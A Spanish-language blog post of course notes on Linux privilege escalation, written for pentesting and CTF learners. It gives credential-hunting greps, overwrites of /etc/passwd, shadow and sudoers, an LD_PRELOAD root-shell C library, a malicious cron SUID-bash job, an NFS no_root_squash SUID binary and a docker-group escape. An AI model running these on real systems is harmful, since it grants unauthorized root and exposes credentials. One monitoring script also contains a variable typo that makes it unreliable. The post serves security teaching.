---
title: Linux Privilege Escalation ❤
author: sha16
categories: [linux, privesc]
tags: [linux, cheat-sheet, privesc] 
---

Estas son mis notas del curso de *The CyberMentor*, [Linux Privilege Escalation for Beginners](https://academy.tcm-sec.com/p/linux-privilege-escalation), el cual recomiendo 
encarecidamente a todas las personas que se están recién iniciando en el área del pentesting, red team, CTFs, etc.

Para todos aquellos que ya tengan un tiempo en el área, créanme que será un excelente repaso de conceptos básicos...

---

# God Level Resources 💯

[Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

[Privilege Escalation - Linux · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

[PayloadsAllTheThings/Linux - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[Basic Linux Privilege Escalation - g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[TCM-Course-Resources/Linux-Privilege-Escalation-Resources: Compilation of Resources for TCM's Linux Privilege Escalation course](https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources)

---

# System Enumeration

*Enumeración de información importante del sistema: versión de sistema operativo y kernel, componentes, CPU, variables de entorno, procesos y subprocesos asociados a usuarios/daemons.*

```bash
# Operating System & Kernel Information
uname -a
lsb_release -a
cat /proc/version
cat /etc/issue
lscpu
cat /etc/os-release

# Check Environment Variables
env
export

# Check mounts
df -h
findmnt
findmnt -l
findmnt -D
findmnt -s

# Installed Dependencies -> Check versions
dpkg -l

# Process & Subprocess
ps aux
ps -faux
ps -eo uid,user,pid,cmd
ps faux | grep root
```

# User Enumeration

*Recopilación de información importante acerca de los usuarios y grupos del sistema, archivos y directorios, privilegios SUDO.*

```bash
# User & Groups
whoami
id

# Check Users Resources
ls -la /home/
ls -la /home/<user>

# Check SUDO privileges
sudo -l 

# Users & Daemons 
cat /etc/passwd

# Check if you can escalate with this form
su -
```

# Networking Enumeration

*Información acerca de la red en la que se encuentra el servidor, interfaces de red, conexiones locales, puertos internos y externos, enumeración de equipos en la red vía ARP.*

```bash
# Local Interfaces & Network Information
ifconfig
ip a
route
ip route
ip neigh
hostname -I
cat /etc/hosts

# Local connections (TCP & UDP)
netstat -nat
netstat -ano

# Hosts via ARP Scan
arp -a
arp-scan -I <network-interface> -l 
```

# Password Hunting

*Búsqueda recursiva de credenciales hardcodeadas en el sistema de archivos del sistema operativo.* 

```bash
# Looking for hardcoded credentials
grep -riE "passwd|password|pass|creds|credentials|dbconnect|connection" / 2>/dev/null
grep -rnwieE --color=always "passwd|password|pass|creds|credentials|dbconnect|connection" / 2>/dev/null
grep -ri "passord" / 2>/dev/null
grep -rnwie --color=always "PASSWORD" / 2>/dev/null
grep -rnwieE --color=always "PASSWORD=|PASS=" / 2>/dev/null

# Looking Password Files
locate key
locate id_rsa
locate credentials 
locate password
whereis password
whereis credentials

# Looking Credentials in Environment Variables
env | grep -iE 'pass|password'
export | grep -iE 'pass|password'

# Look for configuration files (eg: wp-config.php)
locate config

# Find SSH Files
find / -name id_rsa 2>/dev/null
find / -name id_rsa.pub 2>/dev/null
find / -name authorized_keys 2>/dev/null
find / -name known_hosts 2>/dev/null

# Always check history commands user
history
cat /home/<user>/.bash_history
```

---

# Automated Enumeration Tools

*This tools are very useful to locate possible attack vectors for privilege escalation:*

- [PEASS-ng/linPEAS at master · carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels](https://github.com/diego-treitos/linux-smart-enumeration)
- [rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
- [mzet-/linux-exploit-suggester: Linux privilege escalation auditing tool](https://github.com/mzet-/linux-exploit-suggester)
- [sleventyeleven/linuxprivchecker: linuxprivchecker.py -- a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)

---

# Kernel Exploits

## ¿Qué es el Kernel?

Es el componente principal de un sistema operativo que tiene control de todo. 

Su rol más importante es facilitar la comunicación e interacción entre los distintos componentes de una computadora, abarcando desde el hardware hasta el software, permitiendo que estos funcionen en conjunto correctamente.

![Linux Kernel](https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg)

## Common Linux Kernel Exploits

*Este es un repositorio con los exploits de Kernel más comunes en sistemas operativos GNU/Linux.*

Un buen punto a tener en cuenta siempre, es que si la versión del Kernel es antigua, 4.8.3 hacia abajo, probablemente es vulnerable a DirtyCow. Por lo tanto, si tienes un servidor con un Kernel Linux 2.X / 3.X, date por seguro que hay una vulnerabilidad DirtyCow.

**Linux Kernel Exploits:** [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

### Linux Exploit Suggester

Es una herramienta que nos permite enumerar vectores de escalación de privilegios a través de exploits para componentes vulnerables del sistema operativo, o del mismo kernel.

```bash
./linux-exploit-suggester.sh 
```

### Other Exploits

[ly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation](https://github.com/ly4k/PwnKit)

[briskets/CVE-2021-3493: Ubuntu OverlayFS Local Privesc](https://github.com/briskets/CVE-2021-3493)

---

# Passwords & File Permissions

Si tenemos privilegios de escritura en los archivos `/etc/passwd` o `/etc/shadow`, tenemos una vulnerabilidad misconfiguration que nos permitirá cambiar las contraseñas de los usuarios y escalar privilegios en el servidor.

```bash
root@tryit-sharing:~# ls -l /etc/{passwd,shadow}                                                                                                       
-rw-r--rw- 1 root root   1491 Sep 24 00:06 /etc/passwd                                                                                                 
-rw-r--rw- 1 root shadow  780 Sep 24 00:06 /etc/shadow
```

Lo suyo es generar un hash de tipo crypt, o bcrypt, y remplazarlo en los campos de contraseña en cualquiera de los dos archivos (siempre que podamos escribir en ellos). Para generar nuestra contraseña cifrada posemos utilizar:

```bash
# Algoritmo DES (crypt)
openssl passwd <new-password>

# Algoritmo sha-512 (crypt)
mkpasswd <new-password>
```

Para editar un archivo tienes que utilizar un editor de texto el cual, como su mismo nombre lo indica, te permitirá modificar el contenido del fichero. Entre los más conocidos tienes: `nano`, `vim`, `micro` y `nvim`.

Para el archivo `/etc/passwd` sería remplazar la `x` por el hash generado:

```bash
# Contenido del archivo original
root:x:0:0:root:/root:/bin/bash                                                                                                                        
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                        
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                   
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                                     
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
[REDACTED]

# Debería quedar así luego de modificarlo...
root:jKw6eSezZulQU:0:0:root:/root:/bin/bash                                                                                                                        
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                        
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                   
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                                     
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
[REDACTED]
```

En el caso del fichero `/etc/shadow` sería remplazar el asterisco (`*`), o el hash que se encuentre, por la contraseña cifrada que hemos creado:

```bash
# Contenido del archivo original
root:*:19258:0:99999:7:::                                                                                                                              
daemon:*:19258:0:99999:7:::                                                                                                                            
bin:*:19258:0:99999:7:::                                                                                                                               
sys:*:19258:0:99999:7:::                                                                                                                               
sync:*:19258:0:99999:7:::
...
[REDACTE]

# Debería quedar así luego de modificarlo...
root:jKw6eSezZulQU:19258:0:99999:7:::                                                                                                                              
daemon:*:19258:0:99999:7:::                                                                                                                            
bin:*:19258:0:99999:7:::                                                                                                                               
sys:*:19258:0:99999:7:::                                                                                                                               
sync:*:19258:0:99999:7:::
...
[REDACTE]
```

Luego de reemplazar el archivo sólo habría que autenticarnos con el usuario e indicar la contraseña que establecimos en el archivo (obviamente su valor real, no el hash 😅):

```bash
su <user>
```

Si tienes dudas sobre la explotación te recomiendo mirar este video que subí hace algún tiempo a YouTube: [https://youtu.be/eksxwYF8OCQ](https://youtu.be/eksxwYF8OCQ)

Otro archivo que es susceptible a escalación de privilegios mediante permisos de escritura es el `/etc/sudoers`. Para esto bastaría con añadir la siguiente línea en el mismo:

```bash
<user> ALL=(ALL:ALL) ALL
```

Añadiendo esto podremos ejecutar cualquier comando con el usuario `root` a partir del programa `sudo`.

Cualquiera de las opciones que se presentan a continuación servirá para entablar una sesión con el usuario `root`:

```bash
sudo su
sudo /bin/bash
sudo -u root /bin/bash
sudo /bin/sh
sudo -u root /bin/sh
```

---

# SSH Keys Misconfiguration

Cuando un host posee servicios SSH podemos buscar ciertos misconfiguration que nos podría permitir pivotar de usuario en el sistema, o bien, directamente escalar privilegios.

Para verificar esto, siempre es importante que chequemos:

- Si tenemos privilegios de escritura en un archivo `authorized_keys`, ya sea del usuario `root` u otro, podemos autenticarnos con el mismo mediante el servicio SSH. Para esto debemos modificarlo, colocar nuestra clave pública dentro del mismo y autenticarnos con nuestra clave privada indicando el usuario.
- Lo otro sería enumerar archivos con claves ID RSA para probar autenticarnos como otro usuario en el servidor, ya sea efectuando movimiento lateral o vertical (es importante checar si es que existen backups).

---

# Abusing SUDO Privileges

Es posible abusar de distintos binarios del sistema operativo cuando se pueden ejecutar en el contexto de otro usuario mediante SUDO, o privilegios SUID (que serán explicados más adelante).

Para esto puedes checar el sitio **GTFOBins** donde se describen las distintas formas que existen para abusar de los mismos y explotarlos: 

- [https://gtfobins.github.io/](https://gtfobins.github.io/)

Por otra parte puede checar algunas hojas de trucos donde se describen formas comunes de escalar privilegios mediante SUDO:

- [Abusing SUDO (Linux Privilege Escalation) - Touhid's Blog](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/)

## Privilege Escalation vía SUDO + LD_PRELOAD

A través de la variable de entorno LD_PRELOAD se pueden especificar los binarios de las bibliotecas compartidas, las cuales son cargadas en memoria antes de que un binario sea ejecutado. Estas serán ejecutada antes de la ejecución del programa real que se invocó. De esta manera, si un usuario es capaz de modificar dicha variable de entorno, será capaz de utilizarla para escalar privilegios en el sistema.

Para esto lo primero que debemos hacer es checar si tenemos la capacidad de modificar la variable de entorno por medio del comando `sudo -l`.

Si en el output del comando visualizamos `env_keep+=LD_PRELOAD`, es porque podemos explotar la vulnerabilidad.

Para realizarlo, bastaría con computar un binario que ejecute lo siguiente: por una parte eliminar el valor actual de la variable `LD_PRELOAD`, establecer el UID y GID en `0`, o sea el del usuario `root` y,  para finalizar, que la instrucción a ejecutar sea lanzar una shell `/bin/bash`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Este archivo debe ser compilado para obtener el binario como tal. Para ello podemos ejecutar la siguiente instrucción, utilizando el compilador `gcc`:

```bash
gcc -fPIC -shared -o <binary-name>.so <payload-name>.c -nostartfiles

# Example
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

De esta manera al ejecutar SUDO, indicando el nuevo valor de la variable de entorno `LD_PRELOAD`, ejecutaremos la `/bin/bash` que nosotros definimos en el binario:

```bash
sudo LD_PRELOAD=<path>/<binary-name>.so <binary-sudo>

# Example
sudo LD_PRELOAD=/home/sha-16/shell.so /usr/bin/whoami
```

## Sudo 1.8.27 - Security Bypass

El año 2019 se encontró una forma de evadir la denegación de ejecutar un comando con `root` mediante `sudo`. Para checar esto se podía ejecutar `sudo -l`, el cual debía mostrar la siguiente línea en el output: 

```bash
<user> ALL=(ALL,!root) /bin/bash

# Example
sha-16 ALL=(ALL,!root) /bin/bash
```

Básicamente esta configuración indica que puedes ejecutar el comando `/bin/bash`, por medio de `sudo`, con cualquier usuario, excepto con `root`**.**

Entonces para evadir dicha medida, y lograr ejecutar el comando con el usuario `root` de igual forma, se podía indicar la siguiente sentencia y escalar privilegios en el servidor:

```bash
sudo -u#-1 /bin/bash
```

**Vulnerabilidad en ExploitDB**: [sudo 1.8.27 - Security Bypass - Linux local Exploit](https://www.exploit-db.com/exploits/47502)  

## Sudo Version > 1.8.26 (****CVE-2019-18634****)

Es una vulnerabilidad de SUDO se presenta cuando la configuración *pwfeedfack* se encuentra habilitado en el archivo `/etc/sudoers`. Gracias a esto los usuarios con privilegios SUDO pueden explotar un desbordamiento de buffer e inyectar instrucciones en el contexto del otro usuario por medio del programa ejecutado.

Para explotar la vulnerabilidad podemos utilizar el siguiente exploit: [https://github.com/saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

Dado que es un archivo escrito en C, debemos compilarlo para generar el binario de la siguiente manera:

```bash
gcc -o exploit exploit.c
```

Una vez compilado, quedaría solo ejecutarlo en el sistema vulnerable:

```bash
./exploit
```

**TryHackMe Lab to exploit this vuln:**  [TryHackMe - Sudo Buffer Overflow](https://tryhackme.com/room/sudovulnsbof)

---

# SUID Permissions

Los permisos SUID son privilegios que nos permiten ejecutar un archivo o binario en el contexto del usuario propietario del mismo. Esto significa que si tenemos un binario con permisos SUID y el propietario es `root`, al ejecutarlo lo estaremos haciendo en el contexto del usuario `root` y no con el que tenemos nuestra sesión actual.

Al ser así, existen varias formas de aprovecharlos para encontrar vectores de ataque que nos pueden permitir escalar privilegios en el servidor, o pivotar de usuario en el sistema. 

Estas las puedes encontrar detalladas en la plataforma [GTFOBins](http://gtfobins.github.io/).

Para enumerar archivos, o binarios, con permisos SUID, podemos ejecutar cualquiera de las dos opciones que se presentan a continuación: 

```bash
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null 

# You can look their privileges
find / -perm -4000 -ls 2>/dev/null
```

Lo suyo es checar cada binario para saber si es que pueden ser una vía potencial de escalación de privilegios.

Habrán veces en las que vamos a tener en frente binarios con permisos SUID que no conozcamos y que incluso no se encuentren en GTFOBins. 

Ante esto tenemos distintas opciones a considerar:

- Monitorear el comportamiento del binario al ejecutarse con `strace` (filtra operaciones `open`, `access` o `No such file…`; con esto pondremos buscar las dependencias que utiliza el mismo aplicativo para ver si las podemos “suplantar”).
- Aplicar técnicas de reversing sobre el binario con `ghidra`.
- Enumerar el contenido legible del binario con el comando `strings` (buscar de credenciales hardcodeadas, dependencias del binario, archivos, etc).

La idea de esto es poder encontrar alguna vía potencial para explotar Buffer Overflow, PATH Hijacking o Library Hijacking y lograr escalar privilegios en el servidor.

---

# Nginx Privilege Escalation (CVE-2016-1247)

Esta es una vulnerabilidad que se presenta sólo en algunas versiones paquetes de Nginx: 

- Anterior a **1.6.2-5+deb8u3** en **Debian jessie**,
- Anterior a **1.4.6-1ubuntu3.6** en **Ubuntu 14.04 LTS**.
- Anterior a **1.10.0-0ubuntu0.16.04.3** en **Ubuntu 16.04 LTS**.
- Anterior a **1.10.1-0ubuntu1.1** en **Ubuntu 16.10**.

La vulnerabilidad es generada a partir de una configuración incorrecta de permisos en los logs de Nginx que permite a un usuario, dueño del servidor web (`www-data`), crear un enlace simbólico que apunte hacia una biblioteca compartida creada y controlada por el atacante para aprovechar el misconfiguration y ser ejecutada una vez se arranque, o reinicie, el servidor web.

Para checar las versiones de los paquetes de Nginx instalados en el servidor puedes ejecutar el siguiente comando:

```bash
dpkg -l | grep -i "nginx"
```

Es de suma importancia checar que tenemos los respectivos privilegios asignados de manera incorrecta en los logs del servidor web:

```bash
$ ls -ld /var/log/nginx/*
-rw-r----- 1 www-data adm         0 Nov 12 22:31 /var/log/nginx/access.log
-rw-r--r-- 1 root     root    0 Nov 12 22:47 /var/log/nginx/error.log
```

De todas maneras puedes explotar esto más rápido, ejecutando el script que se adjunta en el siguiente enlace: [Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html).

```bash
$ chmod +x nginxed-root.sh
$ /nginxed-root.sh /var/log/nginx/error.log
```

---

# Abusing Capabilities

Se podría decir que son privilegios del usuario `root` fragmentados que se establecen para ejecutar binarios, o archivos, en determinados contextos puntuales. En si evitan que el usuario que los ejecuta asuma la identidad de `root`. Permiten asignar permisos de una forma mucho más selectiva, lo cual de por si lo hace mucho más seguro que los permisos SUID. 

Las capabilities tal como su nombre lo indican son ciertas capacidades que le podemos brindar a un binario/archivo para ser ejecutado, en un determinado contexto, como el usuario `root`, sin abarcar la totalidad del proceso.

Sin embargo, existen ciertos misconfigurations que nos pueden permitir abusar de algunas capabilities para escalar privilegios en el servidor. 

Antes de ahondar más en los misconfigurations, es importante mencionar que existen 3 flags para asignar capabilities: **P (Permitted)**, **E (Effective**) e **I (Inheritable)**:

- **Permitted (p):** Este flag establece que el binario puede invocar esa capabilitie al momento de ser ejecutado.
- **Effective (e):** Este flag permite representar todo el conjunto efectivo de capabilities que el proceso está utilizando. Con esto se evita emitir llamadas especiales en el sistema.
- **Inhertitable (i):** Este flag permite determinar si el proceso al que se asignan los privilegios es extensible o no a procesos hijos.

Si no entendiste la descripción anterior, te dejo el siguiente fragmento que a lo mejor te puede ayudar a entenderlo mejor:

> *“En esencia, asignando a un fichero una capability con flags E y P se puede decir que el proceso derivado en la ejecución tendrá esa capability sin hacerla extensible a los posibles procesos hijos.”* - Incibe-Cert
> 

Bueno, una vez tenemos una buena idea de lo que son las capabilities, podemos ir a los comandos.

Primeramente, si quieres enumerar capabilities, lo suyo sería utilizar al comando `getcap` de la siguiente forma:

```bash
getcap -r / 2>/dev/null
```

De esta manera, realizaremos una búsqueda recursiva de binarios y archivos con capabilties en el sistema operativo.

Una capabilitie muy común de aprovechar es: `CAP_SETUID`, la cual nos permite ejecutar el binario en el contexto de otro usuario a partir del UID que establezcamos al momento de ejecutarlo.

Por ejemplo: Tenemos al intérprete de `python3` con esta capabilitie como se muestra a continuación:

```bash
/usr/bin/python3 = cap_setuid+ep
```

Esto es un misconfiguration y nos permitirá escalar privilegios, ya que con python3 podemos ejecutar código a nivel de sistema, definiendo el UID del usuario que deseemos impersonar.

Para escalar privilegios podemos ejecutar el siguiente comando:

```bash
/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash');"
```

La ejecución de dicho comando importará el módulo de sistema `os`, que nos permitirá establecer el UID `0`, del usuario `root`, y luego de esto, se ejecutará una orden de sistema que sería una shell `/bin/bash` en el contexto del usuario definido en la función `setuid` a partir de su identificador.

 Si tienes capabilties asignadas en tu servidor, puedes revisar el recurso [GTFOBins](https://gtfobins.github.io/) donde se muestran distintas formas de abusar de algunas de estas para escalar privilegios.

---

# Cron Jobs

Las tareas cron, tal como su nombre lo indican, son procesos que se ejecutan en el sistema de forma programada.

Estas son ejecutadas en segundo plano por el usuario asignado para ello.

Existen distintas formas de configurar tareas cron, una es a través del programa `crontab`, otra es por medio del archivo `/etc/crontab`, también se pueden programar mediante los archivos contenidos dentro de los directorios y subdirectorios de `/etc/cron/`. 

La estructura de una tarea cron es la siguiente:

![Cron Jobs Structure](http://kamilslab.com/wp-content/uploads/2016/09/cron-e1473900135807.png)

```bash
# Example: 
# Cron: Execute backups with root user on every friday of month at 00:00
0 0 * * 4 root /root/backups/backup.sh
```

Es importante mencionar que existen temporizadores preestablecidos que permiten programar la ejecución de las tareas con palabras:

- **@reboot:** Se ejecuta sólo una vez (nada más iniciarse el equipo).
- **@yearly:** Se ejecuta sólo una vez al año: **0 0 1 1 ***.
- **@monthly:** Se ejecuta una vez al mes y el primer día a las 12 de la noche: **0 0 1 * ***.
- **@weekly:** Todas las semanas, el primer minuto de la primer hora de la semana: **0 0 * * 0**.
- **@daily: T**odos los días a las 12 de la noche: **0 0 * * ***.
- **@midnight:** Tiene el mismo efecto que el anterior.
- **@hourly: T**odas las horas durante su primer minuto: **0 * * * ***.

Si aún no sabes bien cómo leer cron jobs, te recomiendo utilizar este recurso que te permitirá traducirlas y conocer sus respectivos significados: [Crontab.guru](https://crontab.guru/)

De esta forma, si de seguridad hablamos, podemos abusar de cron jobs si:

- Tenemos permisos de escritura, o alguna forma de modificar, archivos de Cron (ej: `/etc/crontab`).
- Tenemos privilegios de escritura en los archivos o binarios que se ejecutan a partir de los cron jobs.
- Tenemos la capacidad de intervenir en los procesos que se ejecutan con Cron (ej: podemos modificar un archivo que se ejecuta a partir de la ejecución de un binario con cron).
- Tenemos la capacidad de modificar algún archivo `crontab` de otro usuario.

Por ejemplo, si tenemos permisos de escritura en el archivo `/etc/crontab` lo suyo sería la siguiente secuencia de comandos para escalar privilegios:

```bash
# Create a malicious file
$ echo 'cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash' > /tmp/privesc.sh 
$ chmod +x /tmp/privesc.sh

# Add evil cron job to /etc/crontab
$ echo '* * * * * root /tmp/privesc.sh' >> /etc/crontab

# Wait a minute and you will get root by executing the next command
/tmp/bash -p 
```

## Process Monitoring

Una buena técnica de enumeración es la monitorización de procesos con la herramienta [Pspy](https://github.com/DominicBreuker/pspy)

Podemos descargar uno de los [releases](https://github.com/DominicBreuker/pspy/releases), de acuerdo a la arquitectura de nuestro sistema operativo, y ejecutarlo de la siguiente manera para comenzar a ver los procesos que se ejecutan en tiempo real:

```bash
# x86
chmod +x pspy32
./pspy32

# x86_x64
chmod +x pspy64
./pspy64 
```

Una alternativa para esto, puede ser crear un script en bash usando la herramienta `ps`:

```bash
#!/bin/bash

oldProcess=$(ps -eo command);

while true;
do
        newProcess=$(ps -eo command);
        diff <(echo "$oldPrcess") <(echo "$newProcess") | grep "[\>\<]" | grep -vE "procmon.sh|command";
        oldProcess=$newProcess;
				sleep 4;
done
```

La idea de la monitorización de procesos es recopilar información sobre los archivos o binarios que se están ejecutando en segundo plano, qué usuario lo está haciendo y cada cuánto.

Dado esto, es importante checar si es que tenemos algún tipo de privilegio importante sobre los ejecutables de las tareas, checar si podemos alterar el contenido de los mismos, o incluso verificar si es que podemos concatenar su explotación con otra vulnerabilidad.  

---

# Privilege Escalation via NFS Root Squashing

Network File System (NFS) es un protocolo de comunicación, usado comúnmente para compartir archivos a través de la red. Este protocolo al ser configurado de forma incorrecta, podría permitir que los usuarios locales del servidor escalen privilegios dentro del mismo.

## Identificación de recursos compartidos vía NFS

Por defecto NFS se ejecuta en el puerto 2049, el cual puede ser asequible de forma remota (si es que así se configura) a través del comando `showmount`:

```bash
showmount -e <ip>
```

De la misma manera, las carpetas compartidas pueden ser enumeradas localmente a través del archivo `/etc/exports`:

```bash
cat /etc/exports
```

## NFS Vulnerables

Cuando un recurso compartido tiene habilitada la opción `no_root_squash`, significa que dentro de los recursos compartidos se podrán realizar cambios utilizando máximos privilegios de `root`.

De esta manera debemos considerar dos cosas para escalar privilegios:

- El recurso tiene habilitada la opción `no_root_squash` en el fichero `/etc/exports`.
- El recurso es asequible de forma remota desde otros dispositivos de la red.

Esto último nos permitirá crear una montura del mismo en nuestro servidor local de atacantes.

De esta manera, lo primero que debemos realizar es una montura del mismo recurso compartido en nuestro servidor local, para ello podemos ejecutar la siguiente secuencia de comandos:

```bash
mkdir /mnt/nfs_mount
mount -o rw,vers=2 -l nfs <ip>:<share-resource> /mnt/nfs_mount
```

Luego de realizar la montura, podemos proseguir con la siguiente secuencia de comandos, que nos permitirá crear y compilar un binario SUID que al ser ejecutado por el usuario de sistema le entregue una shell de bash con el usuario `root`:

```bash
cd /mnt/nfs_mount/
echo 'int main(){ setuid(0); system("/bin/bash"); return 0; }' > privesc.c
gcc privesc.c -o privesc
chmod 4755 privesc
```

Luego de realizar esto, volvemos al usuarios de bajos privilegios en el servidor y ejecutamos el binario que hemos añadido al recurso compartido:

```bash
./privesc
```

Una vez hecho esto, seremos `root` y habremos escalado privilegios en el servidor.

---

# Privilege Escalation via Docker Group

Si el usuario de tu sesión actual se encuentra en el grupo `docker` tienes una vía de escalación de privilegios en el servidor.

Para ello debes ejecutar la siguiente secuencia de comandos:

```bash
# Server Session:
# Con este comando podrás ver si tu usuario está en el grupo "docker".
$ id

# Con este comando obtendrás las imagenes de Docker
# que están instaladas en el servidor.
$ docker images

# Con este comando lo que harás será:
# 1. Arrancar un contenedor a partir de una imagen instalada en el host.
# 2. Montar la raíz del servidor padre dentro del directorio /mnt del contenedor. 
# De esta manera todos los cambios que se apliquen dentro del directorio 
# /mnt, del contenedor, serán realizados en el servidor padre.
$ docker run -v /:/mnt -it <name>:<tag> /bin/bash

# Container session:
# Se le asignan privilegios SUID a la bash del servidor padre
# montada en el contenedor.
$ chmod 4755 /mnt/bin/bash
$ exit

# Server session:
# Una vez salimos del contenedor nuestra /bin/bash tendrá privielgios
# SUID, por lo que será cuestión de ejecutar el siguiente comando para
# escalar privilegios:
$ /bin/bash -p
```

De manera alternativa puedes utilizar el **GTFOBins**: [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

Si estás interesado en la temática de contenedores, puedes mirarte este post que escribí hace un tiempo sobre [Docker](https://sha-16.github.io/posts/docker-como-ser-un-pro-siendo-noob/).

---

Muchas gracias por haber leído el post, espero que el contenido haya sido útil, cualquier cosa puedes contactarme por mis redes sociales! 💪

Happy Hacking!
